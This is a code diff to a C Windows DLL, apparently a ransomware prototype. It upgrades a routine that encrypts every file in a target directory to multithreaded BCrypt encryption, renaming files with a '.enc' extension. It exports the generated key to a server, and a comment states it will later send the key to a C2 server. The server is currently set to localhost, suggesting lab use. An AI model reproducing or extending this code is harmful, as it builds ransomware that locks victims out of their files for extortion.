@@ -21,6 +21,18 @@ __declspec(dllexport) VoidFunc(char* target) {
     char targetDir[MAX_PATH] = "\0";
     char cryptoFileExt[MAX_EXT] = ".enc";
     char serverName[INTERNET_MAX_HOST_NAME_LENGTH] = "127.0.0.1";
+    INTERNET_PORT serverPort = INTERNET_DEFAULT_HTTP_PORT;
+
+    DWORD procNum = 1;
+    DWORD threadNum = 1;
+
+    // Get the number of processors to set the maximum number of threads
+    if (!getNumberOfProcessors(&procNum)) {
+        threadNum = procNum;
+    }
+    else {
+        printf("WARNING: Could not retrieve the processors number. The software will run on a sigle thread\n");
+    }
 
     // Check the input parameter, comment if not used
     if (target[0] == '\0') {
@@ -43,39 +55,41 @@ __declspec(dllexport) VoidFunc(char* target) {
     size_t totalFileNumber = 0;                     // number of files found
     size_t encryptedFileNumber = 0;                 // number of encrypted files
     ULARGE_INTEGER start, end;                      // start time and end time to measure performance
+    NTSTATUS status = 0;                            // status code returned from BCRYPT functions
 
     // thread pool variables
-    TP_CALLBACK_ENVIRON poolEnv;               // a pool environment struct to handle the thread pool
+    TP_CALLBACK_ENVIRON poolEnv;                    // a pool environment struct to handle the thread pool
     PTP_CLEANUP_GROUP cleanupgroup = NULL;          // a cleanup group handle to safely close all the threads in the pool
 
     // encryption variables
-    HCRYPTPROV hCryptProv = 0;                      // handler for the crypto provider
-    HCRYPTKEY hKey = 0;                             // handler for the encryption key
+    BCRYPT_ALG_HANDLE hAlgProv = NULL;              // handler for the crypto provider
+    BCRYPT_ALG_HANDLE hRng = NULL;                  // handler for the random provider
+    BCRYPT_KEY_HANDLE hKey = NULL;                  // handler for the encryption key
 
     //------------- INIT AND EXECUTE --------------------------------------------------
         // Initialize the thread pool. This will create a thread pool and a cleanup group
         //   and will link them to the same pool environment handler
-    if (!InitThreadPool(&poolEnv, &cleanupgroup)) {
+    if (!InitThreadPool(&poolEnv, &cleanupgroup, threadNum)) {
         printf("Could not initialize the thread pool. Error code: %lu\n", GetLastError());
-        return;
+        goto cleanup;
     }
 
     // Initialize the crypto environment. This will acquire a context and generate a key
-    if (!InitCrypto(&hCryptProv, &hKey)) {
+    if (!initCrypto(&hAlgProv, &hRng, &hKey)) {
         printf("Could not initialize the crypto environment. Error code: %lu\n", GetLastError());
-        return;
+        goto cleanup;
     }
 
     // print the key to a file (this will change to encrypt the key and send it to a C2 server
-    if (!ExportKey(hCryptProv, hKey, serverName)) {
+    if (!ExportKey(&hAlgProv, hKey, serverName, serverPort)) {
         printf("Encryption key could not be exported. Error code: %lu\n", GetLastError());
-        return;
+        goto cleanup;
     }
 
     // start the timer
     GetTime(&start);
 
-    totalFileNumber = StartEncryptionWithThreads(targetDir, cryptoFileExt, &encryptedFileNumber, hKey, &poolEnv, cleanupgroup);
+    totalFileNumber = StartEncryptionWithThreads(targetDir, cryptoFileExt, &encryptedFileNumber, hKey, &hRng, &poolEnv, cleanupgroup, threadNum);
 
     // end the time    
     GetTime(&end);
@@ -88,18 +102,10 @@ __declspec(dllexport) VoidFunc(char* target) {
     printf("Elapsed Time: %llu seconds\n", elapsedMilliseconds);
 
     //------------- CLEAN UP --------------------------------------------------------
-        // Release the encryption key
-    if (hKey) {
-        if (!(CryptDestroyKey(hKey))) {
-            printf("Error during CryptDestroyKey!. Error code: %lu\n", GetLastError());
-        }
-    }
-    // Release the crypto provider handle.
-    if (hCryptProv) {
-        if (!(CryptReleaseContext(hCryptProv, 0))) {
-            printf("Error during CryptReleaseContext!. Error code: %lu\n", GetLastError());
-        }
-    }
+cleanup:
+    if (hKey) { BCryptDestroyKey(hKey); }
+    if (hAlgProv) { BCryptCloseAlgorithmProvider(hAlgProv, 0); }
+    if (hRng) { BCryptCloseAlgorithmProvider(hRng, 0); }
 
     //Clean up: Free the console
     FreeConsole();
